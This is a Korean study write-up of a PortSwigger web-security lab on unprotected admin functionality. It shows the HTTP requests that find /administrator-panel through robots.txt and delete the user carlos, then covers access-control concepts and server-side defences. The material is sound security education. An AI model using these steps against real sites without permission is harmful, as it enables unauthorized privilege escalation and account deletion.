# Lab: Unprotected admin functionality

## 개요

- **난이도**: Apprentice
- **주제**: Access Control — 보호되지 않은 관리자 기능 / 수직적 권한 상승 / `robots.txt` 정보 노출
- **링크**: https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality

## 목표

인증 없이 접근 가능한 관리자 패널(`/administrator-panel`)을 찾아 들어가 `carlos` 계정을 삭제한다.

## Access Control 기초 개념

### 인증(Authentication) vs 인가(Authorization)

```
Authentication (인증)
  "너는 누구인가?" 를 확인
  → 로그인, 세션, 비밀번호

Session Management (세션 관리)
  "이 요청이 같은 사용자의 것인가?" 를 식별
  → 세션 쿠키

Access Control (접근 제어 / 인가)
  "이 사용자가 이 행동을 해도 되는가?" 를 결정
  → 권한 검사
```

인증이 올바르게 동작하더라도, 인가(접근 제어)가 빠지면 권한 없는 사용자가
민감 기능을 사용할 수 있다.

### 접근 제어의 종류

```
[Vertical — 수직적]
  서로 다른 "등급" 의 사용자 간 권한 차이
  일반 사용자 vs 관리자
  → 일반 사용자가 관리자 기능에 접근하면 수직적 권한 상승

[Horizontal — 수평적]
  같은 등급의 다른 사용자 리소스 접근
  A 사용자가 B 사용자의 계좌/주문 조회
  → 수평적 권한 상승 (IDOR 와 밀접)

[Context-dependent — 상황 의존적]
  애플리케이션 상태/순서에 따른 제한
  결제 완료 후 장바구니 수정 금지 등
```

이번 랩은 **수직적 권한 상승(Vertical Privilege Escalation)** 의 가장 기본 형태다.

## 취약 지점

### 1. 관리자 기능에 대한 접근 제어 부재

```
/admin/administrator-panel
  → 관리자 전용이어야 하지만, 서버가 사용자 역할을 검사하지 않음
  → 로그인하지 않은 사용자도 그대로 접근 가능
```

### 2. robots.txt 를 통한 경로 노출

```
GET /robots.txt HTTP/1.1
→
User-agent: *
Disallow: /administrator-panel
```

`robots.txt` 는 크롤러에게 수집을 피할 경로를 알려주는 파일이다.
- 보안 목적으로 만든 것이 아니지만, 숨기려는 민감 경로가 그대로 노출된다.
- 공격자 입장에서는 관리자 패널 경로를 알려주는 힌트가 된다.

## 공격 단계

### 1단계 — robots.txt 확인

```
GET /robots.txt HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

응답:

```
User-agent: *
Disallow: /administrator-panel
```

### 2단계 — 관리자 패널 접근

`/robots.txt` 를 `/administrator-panel` 로 교체해 접속한다.

```
GET /administrator-panel HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

인증/권한 검사 없이 관리자 패널 HTML 이 반환된다.

### 3단계 — carlos 삭제

관리자 패널에서 `carlos` 삭제 링크를 찾아 호출한다.

```
GET /administrator-panel/delete?username=carlos HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

carlos 삭제 완료 → 랩 해결.

## 정보 노출 경로

```
[관리자 경로가 노출되는 대표적인 위치]
  robots.txt           Disallow 라인
  sitemap.xml          URL 목록
  JavaScript           역할 기반 UI 생성 스크립트에 하드코딩된 admin URL
  HTML 주석            개발자 메모
  에러 메시지          스택 트레이스/경로
  응답 헤더            X-Powered-By 등

[공격자 관점]
  "URL 을 예측 불가능하게" 만드는 것은 보안이 아니다 (security by obscurity)
  → 경로를 숨겨도 유출 경로가 있고, 브루트포스로도 찾을 수 있다
```

## 방어

```
[근본 원인]
  관리자 기능에 대한 서버 측 권한 검사가 아예 없음

[올바른 방어]
  1. 모든 민감 기능에 서버 측 접근 제어 적용 (deny by default)
     - 요청마다 세션의 사용자 역할을 검사
     - 클라이언트가 아니라 서버가 판단
  2. 단일 전역 인가 메커니즘 사용
     - 라우트/리소스별 권한을 선언적으로 관리
  3. URL 숨김(obscurity)에 의존하지 않음
  4. robots.txt 에 민감 경로를 기재하지 않음
     - 검색엔진 차단이 목적이면 인증으로 보호가 우선

[안티패턴]
  관리자 링크를 UI 에서만 숨기기
  추측하기 어려운 URL 사용
  robots.txt 로 숨기기
```

## 핵심 정리

- 관리자 패널 `/administrator-panel` 에 접근 제어가 없어 누구나 접근할 수 있었다.
- `robots.txt` 의 `Disallow` 라인이 관리자 경로를 그대로 노출했다.
- `carlos` 삭제 요청을 서버가 권한 검사 없이 처리해 수직적 권한 상승이 성립했다.
- 방어의 핵심은 URL 숨김이 아니라 서버 측 권한 검사(deny by default)다.

## 배운 점

- 접근 제어 취약점의 가장 기본 형태는 "민감 기능에 검사 자체가 없는 것" 이다.
- `robots.txt` 는 보안 기능이 아니며, 오히려 민감 경로를 알려주는 정보 노출源이 될 수 있다.
- URL 을 숨기는 보안(Security by Obscurity)은 유출 경로(JS, robots.txt, sitemap, 브루트포스)가 있으면 무력하다.
